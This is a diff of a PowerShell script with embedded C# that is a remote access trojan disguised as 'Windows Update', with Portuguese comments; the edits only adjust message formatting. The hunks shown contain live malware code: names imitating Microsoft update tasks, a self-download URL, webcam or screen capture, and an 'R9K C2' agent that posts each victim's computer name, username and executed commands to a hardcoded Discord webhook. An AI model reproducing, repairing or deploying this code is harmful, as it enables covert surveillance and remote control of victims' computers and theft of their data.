@@ -13,10 +13,10 @@ $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# Função para Log no Discord (Corrigida sem crases)
+# Função para Log no Discord (Corrigida sem crases que quebram o script)
 function Send-Webhook($msg) {
     try {
-        $content = "[R9K C2] " + $env:COMPUTERNAME + " (" + $env:USERNAME + ") `n" + $msg
+        $content = "[R9K C2] $env:COMPUTERNAME ($env:USERNAME) `n" + $msg
         $body = @{ content = $content } | ConvertTo-Json
         Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
     } catch {}
@@ -296,11 +296,11 @@ if (-not ("R9KAgent" -as [type])) {
                     string banner = "BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|" + nMon;
                     myWriter.WriteLine(banner);
                     
-                    // Log de Conexao
+                    // Log de Conexao Discord
                     try { 
                         System.Net.WebClient wc = new System.Net.WebClient(); 
                         wc.Headers.Add("Content-Type", "application/json"); 
-                        string body = "{\"content\":\"**[R9K C2]** Nova conexao de `" + Environment.MachineName + "` (" + Environment.UserName + ")\"}"; 
+                        string body = "{\"content\":\"**[R9K C2]** Nova conexao de " + Environment.MachineName + " (" + Environment.UserName + ")\"}"; 
                         wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
                     } catch {}
 
@@ -508,7 +508,7 @@ if (-not ("R9KAgent" -as [type])) {
                             File.Delete(tempBmp);
                         } catch {}
                     }
-                    Thread.Sleep(150); // Aproximadamente 6 a 7 FPS
+                    Thread.Sleep(150);
                 }
                 SendMessage(capWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
                 DestroyWindow(capWnd);
@@ -635,7 +635,7 @@ if (-not ("R9KAgent" -as [type])) {
                 try { 
                     System.Net.WebClient wc = new System.Net.WebClient(); 
                     wc.Headers.Add("Content-Type", "application/json"); 
-                    string body = "{\"content\":\"**[R9K CMD]** `" + Environment.MachineName + "` executou: `" + cmd + "`\"}"; 
+                    string body = "{\"content\":\"**[R9K CMD]** " + Environment.MachineName + " executou: " + cmd + "\"}"; 
                     wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
                 } catch {}
 
